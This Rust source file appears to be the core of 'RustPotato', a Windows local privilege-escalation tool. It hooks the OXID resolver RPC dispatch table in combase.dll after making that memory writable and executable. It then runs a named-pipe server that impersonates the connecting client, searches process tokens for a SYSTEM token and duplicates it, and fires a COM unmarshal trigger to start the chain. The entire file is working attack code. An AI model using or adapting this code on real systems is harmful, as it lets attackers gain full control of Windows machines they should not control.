use std::fs::OpenOptions;
use std::io::Write as _;
use std::ptr;
use std::sync::{Arc, Mutex, OnceLock};
use std::thread::JoinHandle;

#[cfg(feature = "debug")]
use std::io::Error;

use winapi::um::{
    fileapi::CreateFileW,
    minwinbase::SECURITY_ATTRIBUTES,
    namedpipeapi::ImpersonateNamedPipeClient,
    namedpipeapi::{ConnectNamedPipe, CreateNamedPipeW},
    securitybaseapi::RevertToSelf,
    winbase::LocalFree,
    winnt::{
        FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE, PAGE_EXECUTE_READWRITE,
    },
};


use super::def::{BAD_HANDLE, MidlServerInfo, RpcDispatchTable, RpcServerInterface};
use super::orcb::NewOrcbRPC;
use super::token::{
    IntegrityLevel, SecurityImpersonationLevel,
    list_process_tokens,
};
use super::trigger::RustPotatoUnmarshalTrigger;
use super::utils::{GUID, WindowsIdentity};
use super::utils::{Sunday, create_security_descriptor, read_memory};
use super::win32::ldr::ldr_module;
use super::win32::ntdll::ntdll;

use winapi::ctypes::c_void;

#[derive(Clone)]
pub struct RustPotatoContext {
    orcb_rpc_guid: GUID,
    pub combase_module: *mut c_void,
    pub dispatch_table_ptr: *const c_void,
    pub use_protseq_function_ptr: *mut c_void,
    pub use_protseq_function_param_count: u32,
    pub dispatch_table: Vec<*mut c_void>,
    fmt_string_offset_table: Vec<u16>,
    pub proc_string: *mut u8,
    pub use_protseq_delegate: *mut c_void,
    pub system_identity: Option<Arc<Mutex<WindowsIdentity>>>,
    pub pipe_server_thread: Arc<Mutex<Option<JoinHandle<()>>>>,
    pub is_start: bool,
    pub is_hook: bool,
    pub server_pipe: String,
    pub client_pipe: String,
    pub unmashal_trigger: Option<RustPotatoUnmarshalTrigger>,
}

unsafe impl Sync for RustPotatoContext {}
unsafe impl Send for RustPotatoContext {}

pub static GLOBAL_CONTEXT: OnceLock<Arc<RustPotatoContext>> = OnceLock::new();

impl RustPotatoContext {
    pub fn new() -> Self {
        RustPotatoContext {
            orcb_rpc_guid: GUID::new("18f70770-8e64-11cf-9af1-0020af6e72f4".to_string()),
            combase_module: ptr::null_mut(),
            dispatch_table_ptr: ptr::null_mut(),
            use_protseq_function_ptr: ptr::null_mut(),
            use_protseq_function_param_count: 0xFFFFFF,
            dispatch_table: Vec::new(),
            fmt_string_offset_table: Vec::new(),
            proc_string: ptr::null_mut(),
            use_protseq_delegate: ptr::null_mut(),
            system_identity: Some(Arc::new(Mutex::new(WindowsIdentity::default()))),
            pipe_server_thread: Arc::new(Mutex::new(None)),
            is_start: false,
            is_hook: false,
            server_pipe: String::from("\\\\.\\pipe\\RustPotato\\pipe\\epmapper"),
            client_pipe: String::from("ncacn_np:localhost/pipe/RustPotato[\\pipe\\epmapper]"),
            unmashal_trigger: None,
        }
    }

    pub fn init_context(&mut self) -> Option<()> {
        unsafe {
            _print!("\n[+] INITIALIZE CONTEXT - START\n----------------------------------");

            let mut module_size: usize = 0;
            let module_base = ldr_module(0x56777929, Some(&mut module_size)); // combase.dll

            if module_base.is_null() || module_size == 0 {
                _print!("[-] Failed to locate combase.dll module.");
                return None;
            }

            self.combase_module = module_base as *mut c_void;

            // Get the handle of the current process
            let process = -1isize as *mut winapi::ctypes::c_void;

            _print!(
                "[+] combase.dll: Base Address: 0x{:016X}, Size: {}",
                module_base as usize,
                module_size
            );

            // Read the module's memory content
            let dll_content = read_memory(process, module_base as *mut u8, module_size);
            if dll_content.is_empty() {
                _print!("[-] Failed to read DLL content from memory.");
                return None;
            }

            // Construct a pattern to locate the `RPC_SERVER_INTERFACE` structure
            let mut pattern: Vec<u8> = Vec::new();

            if let Err(_) =
                pattern.write(&(core::mem::size_of::<RpcServerInterface>() as u32).to_le_bytes())
            {
                return None;
            }

            // Append the RPC GUID in little-endian format to the pattern
            pattern.extend_from_slice(&self.orcb_rpc_guid.to_le_bytes().unwrap());

            _print!("[+] Searching for RPC_SERVER_INTERFACE structure...");

            // Use the Sunday algorithm to search for the pattern in memory
            let matches = Sunday::search(&dll_content, &pattern);

            if matches.is_empty() {
                _print!("[-] Failed to locate RPC_SERVER_INTERFACE structure.");
                return None;
            }

            if let Some(&first_match) = matches.first() {
                // Locate the `RPC_SERVER_INTERFACE` structure in memory
                let rpc_server_interface_ptr =
                    dll_content.as_ptr().add(first_match) as *const RpcServerInterface;

                let rpc_server_interface = &*rpc_server_interface_ptr;

                _print!(
                    "[+] RPC_SERVER_INTERFACE located at: 0x{:016X}",
                    rpc_server_interface_ptr as usize
                );

                // Retrieve pointers to key structures
                let rpc_dispatch_table =
                    &*(rpc_server_interface.dispatch_table as *const RpcDispatchTable);
                let midl_server_info =
                    &*(rpc_server_interface.interpreter_info as *const MidlServerInfo);

                _print!(
                    "[+] RPC_SERVER_INTERFACE.DispatchTable: 0x{:016X}",
                    rpc_server_interface.dispatch_table as usize
                );
                _print!(
                    "[+] RPC_SERVER_INTERFACE.InterpreterInfo: 0x{:016X}",
                    rpc_server_interface.interpreter_info as usize
                );

                // Extract and store pointers for later use
                self.dispatch_table_ptr = midl_server_info.dispatch_table as *const c_void;
                _print!(
                    "[+] MIDL_SERVER_INFO.DispatchTable: 0x{:016X}",
                    self.dispatch_table_ptr as usize
                );

                let fmt_string_offset_table_ptr = midl_server_info.fmt_string_offset;
                _print!(
                    "[+] MIDL_SERVER_INFO.FmtStringOffset: 0x{:016X}",
                    fmt_string_offset_table_ptr as usize
                );

                self.proc_string = midl_server_info.proc_string;
                _print!(
                    "[+] MIDL_SERVER_INFO.ProcString: 0x{:016X}",
                    self.proc_string as usize
                );

                // Populate dispatch table with function pointers
                self.dispatch_table = (0..rpc_dispatch_table.dispatch_table_count)
                    .map(|i| {
                        let offset = i as usize * std::mem::size_of::<*mut c_void>();
                        *(self.dispatch_table_ptr.add(offset) as *mut *mut c_void)
                    })
                    .collect();

                // Populate format string offset table
                self.fmt_string_offset_table = (0..rpc_dispatch_table.dispatch_table_count)
                    .map(|i| {
                        let offset = fmt_string_offset_table_ptr.add(i as usize);
                        *(offset as *const u16)
                    })
                    .collect();

                // Retrieve the first function pointer from the dispatch table
                self.use_protseq_function_ptr = self.dispatch_table[0];

                // Retrieve the number of parameters for the first function
                self.use_protseq_function_param_count = *(self
                    .proc_string
                    .add(self.fmt_string_offset_table[0] as usize + 19)
                    as *const u8) as u32;

                _print!(
                    "[+] Dispatch table entries: {}",
                    rpc_dispatch_table.dispatch_table_count
                );
                _print!(
                    "[+] UseProtseqFunction parameter count: {}",
                    self.use_protseq_function_param_count
                );

                #[cfg(feature = "debug")]
                for (i, &entry) in self.dispatch_table.iter().enumerate() {
                    _print!("[+] DispatchTable entry {}: 0x{:016X}", i, entry as usize);
                }

                #[cfg(feature = "debug")]
                for (i, &offset) in self.fmt_string_offset_table.iter().enumerate() {
                    _print!("[+] FmtStringOffset entry {}: {}", i, offset);
                }
            }

            Some(())
        }
    }

    pub fn setup_rpc_context(&mut self) -> Option<()> {
        // Ensure the `combase.dll` module is loaded
        if self.combase_module.is_null() {
            _print!("[-] combase.dll module not found");
            return None;
        }

        // Validate critical components of the context
        if self.dispatch_table.is_empty()
            || self.proc_string.is_null()
            || self.use_protseq_function_ptr.is_null()
        {
            _print!("[-] Failed to find IDL structure");
            return None;
        }

        // Attempt to set the global context, ensuring only one instance exists
        if GLOBAL_CONTEXT.set(Arc::new(self.clone())).is_err() {
            _print!("[!] Global context is already set");
        }

        // Map the `use_protseq_delegate` to the appropriate function based on the parameter count
        self.use_protseq_delegate = match self.use_protseq_function_param_count {
            4 => NewOrcbRPC::fun4 as *mut c_void,
            5 => NewOrcbRPC::fun5 as *mut c_void,
            6 => NewOrcbRPC::fun6 as *mut c_void,
            7 => NewOrcbRPC::fun7 as *mut c_void,
            8 => NewOrcbRPC::fun8 as *mut c_void,
            9 => NewOrcbRPC::fun9 as *mut c_void,
            10 => NewOrcbRPC::fun10 as *mut c_void,
            11 => NewOrcbRPC::fun11 as *mut c_void,
            12 => NewOrcbRPC::fun12 as *mut c_void,
            13 => NewOrcbRPC::fun13 as *mut c_void,
            14 => NewOrcbRPC::fun14 as *mut c_void,
            _ => {
                _print!(
                    "[-] Unsupported UseProtseqFunctionParamCount: {}",
                    self.use_protseq_function_param_count
                );
                return None;
            }
        };

        Some(())
    }

    pub fn hook_rpc(&mut self) -> Option<()> {
        unsafe {
            let mut region_size = std::mem::size_of::<*mut c_void>() * self.dispatch_table.len();
            let nt = ntdll();

            let mut old_protect: u32 = 0;
            let status = nt.nt_protect_virtual_memory.run(
                -1isize as *mut c_void,
                &mut (self.dispatch_table_ptr as *const _ as *mut _),
                &mut region_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );

            if status != 0 {
                _print!(
                    "[-] Memory protection update failed. Error: {}",
                    Error::last_os_error()
                );

                _print!(
                    "[-] Memory protection update failed. Error: 0x{:08X}",
                    status
                );
                return None;
            }

            _print!(
                "[+] Dispatch table pointer: 0x{:016X}",
                self.dispatch_table_ptr as usize
            );

            _print!("[+] Memory protection updated to PAGE_EXECUTE_READWRITE");

            _print!(
                "[+] Hook function pointer: 0x{:016X}",
                self.use_protseq_delegate as usize
            );

            // Replace the first entry in the dispatch table with the hook function
            let dispatch_entry = self.dispatch_table_ptr as *mut *mut c_void;
            *dispatch_entry = self.use_protseq_delegate;

            _print!(
                "[+] Dispatch table successfully hooked. New entry: 0x{:016X}",
                *dispatch_entry as usize
            );

            self.is_hook = true; // Mark the hook as active
            _print!("[+] RPC hook successfully installed");

            Some(())
        }
    }

    pub fn restore_hook_rpc(&mut self) -> Option<()> {
        unsafe {
            // Ensure the hook is active and the original function pointer is available
            if self.is_hook && !self.use_protseq_function_ptr.is_null() {
                // Restore the original function pointer in the dispatch table
                let dispatch_entry = self.dispatch_table_ptr as *mut *mut c_void;
                *dispatch_entry = self.use_protseq_function_ptr;

                _print!(
                    "[+] Dispatch table restored to original function: 0x{:016X}",
                    *dispatch_entry as usize
                );

                // Mark the hook as no longer active
                self.is_hook = false;
                _print!("[+] RPC hook successfully removed");
                Some(())
            } else {
                // Indicate failure due to invalid state or missing function pointer
                _print!(
                    "[!] Restoration failed: hook is inactive or original function pointer is null"
                );
                None
            }
        }
    }

    pub fn start_pipe_server(&mut self) -> Option<()> {
        if self.is_hook && !self.is_start {
            let server_pipe = self.server_pipe.clone();
            let system_identity: Arc<Mutex<WindowsIdentity>> =
                Arc::clone(self.system_identity.as_ref().unwrap());

            self.pipe_server_thread = Arc::new(Mutex::new(Some(std::thread::spawn(move || {
                unsafe {
                    _print!("[+] Initializing pipe server");

                    // Create security descriptor
                    let security_descriptor_string = "D:(A;OICI;GA;;;WD)";
                    let (security_descriptor, _security_descriptor_size) =
                        match create_security_descriptor(security_descriptor_string) {
                            Some(desc) => desc,
                            None => return,
                        };

                    // Create security attributes
                    let mut sa = SECURITY_ATTRIBUTES {
                        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
                        lpSecurityDescriptor: security_descriptor as *mut _,
                        bInheritHandle: 0,
                    };

                    // Convert server pipe name to wide string
                    let server_pipe_wide: Vec<u16> =
                        server_pipe.encode_utf16().chain(Some(0)).collect();

                    // Create the named pipe
                    let pipe_handle: *mut winapi::ctypes::c_void = CreateNamedPipeW(
                        server_pipe_wide.as_ptr(),
                        0x00000003, // PIPE_ACCESS_DUPLEX
                        0x00000000, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT
                        255,        // PIPE_UNLIMITED_INSTANCES
                        521,        // Output buffer size
                        0,          // Input buffer size
                        123,        // Default timeout
                        &mut sa,
                    );

                    if pipe_handle == BAD_HANDLE {
                        _print!("[-] Failed to create named pipe.");
                        LocalFree(security_descriptor as *mut _);
                        return;
                    }

                    _print!("[+] Named pipe created: {}", server_pipe);
                    _print!("[+] Pipe handle: 0x{:08X}", pipe_handle as usize);
                    _print!("[+] Waiting for pipe connection");

                    let connected = ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0;

                    if connected
                        || winapi::um::errhandlingapi::GetLastError()
                            == winapi::shared::winerror::ERROR_PIPE_CONNECTED
                    {
                        _print!("[+] Pipe connection established");

                        if ImpersonateNamedPipeClient(pipe_handle) != 0 {
                            _print!("[+] Impersonation of pipe client successful");
                            _print!("[+] Searching for System Token");

                            let mut is_find_system_token = false;

                            list_process_tokens(None, |token| {
                                if token.sid.clone().unwrap().value == "S-1-5-18"
                                    && token.impersonation_level.unwrap()
                                        >= SecurityImpersonationLevel::Impersonation
                                    && token.integrity_level.unwrap()
                                        >= IntegrityLevel::SystemIntegrity
                                {
                                    let my_primary_token = match token.duplicate_token_ex() {
                                        Ok(token) => token,
                                        Err(_e) => {
                                            _print!("[-] Failed to duplicate token. Error: {}", _e);
                                            return false;
                                        }
                                    };

                                    let mut system_identity_guard = system_identity.lock().unwrap();
                                    system_identity_guard
                                        .set_token(my_primary_token as *mut winapi::ctypes::c_void);

                                    _print!(
                                        "[+] System token found PID: {}, Token: 0x{:08X}, Username: {}",
                                        token.target_process_pid,
                                        token.target_process_token as usize,
                                        token.sid.unwrap().to_username().unwrap()
                                    );

                                    _print!(
                                        "[+] Duplicated token as primary: 0x{:08X}",
                                        my_primary_token as usize
                                    );

                                    is_find_system_token = true;
                                    false // Stop searching
                                } else {
                                    true // Continue searching
                                }
                            });

                            let result = RevertToSelf();
                            if result != 0 {
                                _print!("[+] Reverted to self successfully");
                            } else {
                                _print!(
                                    "[-] Failed to revert to self. Error: {}",
                                    Error::last_os_error()
                                );
                            }

                        } else {
                            _print!(
                                "[-] Failed to impersonate pipe client. Error: {}",
                                Error::last_os_error()
                            );
                        }
                    } else {
                        _print!(
                            "[-] Failed to connect named pipe. Error: {}",
                            Error::last_os_error()
                        );
                    }

                    ntdll().nt_close.run(pipe_handle);
                    LocalFree(security_descriptor as *mut _);
                }
            }))));

            self.is_start = true;

            Some(())
        } else {
            _print!("[!] Cannot start: Hook is inactive or server already running");
            None
        }
    }

    pub fn stop_pipe_server(&mut self) -> Option<()> {
        if self.is_start {
            // Mark the server as stopped
            self.is_start = false;

            // Acquire the lock on the pipe server thread and extract its value
            if let Ok(mut thread_lock) = self.pipe_server_thread.lock() {
                if let Some(pipe_server_thread) = thread_lock.take() {
                    // Attempt to send a termination signal to the pipe server
                    let security_attributes = SECURITY_ATTRIBUTES {
                        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
                        lpSecurityDescriptor: ptr::null_mut(),
                        bInheritHandle: 0,
                    };

                    unsafe {
                        // Convert the pipe name to a wide string
                        let server_pipe_wide: Vec<u16> =
                            self.server_pipe.encode_utf16().chain(Some(0)).collect();

                        // Open the named pipe to signal termination
                        let pipe_handle = CreateFileW(
                            server_pipe_wide.as_ptr(),
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            &security_attributes as *const _ as *mut _,
                            winapi::um::fileapi::OPEN_EXISTING,
                            0,
                            ptr::null_mut(),
                        );

                        if pipe_handle != BAD_HANDLE {
                            _print!("[+] Sending termination signal to the pipe server.");

                            let mut stream =
                                match OpenOptions::new().write(true).open(&self.server_pipe) {
                                    Ok(file) => file,
                                    Err(_e) => {
                                        _print!(
                                            "[-] Failed to open pipe for termination signal: {:?}",
                                            _e
                                        );
                                        return None;
                                    }
                                };

                            stream
                                .write_all(&[0xAA]) // Send a termination signal byte
                                .ok()?;
                            stream.flush().ok()?;
                        } else {
                            // If the pipe cannot be opened, unpark the thread
                            pipe_server_thread.thread().unpark();
                        }
                    }

                    // Wait for the thread to complete execution
                    match pipe_server_thread.join() {
                        Ok(_) => {
                            _print!("[+] Pipe server thread terminated successfully.");
                            Some(())
                        }
                        Err(_e) => {
                            _print!("[-] Failed to join pipe server thread: {:?}", _e);
                            None
                        }
                    }
                } else {
                    _print!("[-] Pipe server is not running.");
                    None
                }
            } else {
                None
            }
        } else {
            None
        }
    }

    pub fn start_trigger(&mut self) -> Option<()> {
        // Check if the pipe server is running before starting the trigger
        if self.is_start {
            if let Some(trigger) = RustPotatoUnmarshalTrigger::new() {
                // Store the trigger in the context
                self.unmashal_trigger = Some(trigger);

                if self.unmashal_trigger.is_none() {
                    _print!("[-] Failed to initialize unmarshalling trigger");
                    return None;
                }

                // Execute the trigger's logic
                self.unmashal_trigger.as_ref().unwrap().trigger();

                Some(())
            } else {
                None
            }
        } else {
            None
        }
    }

}
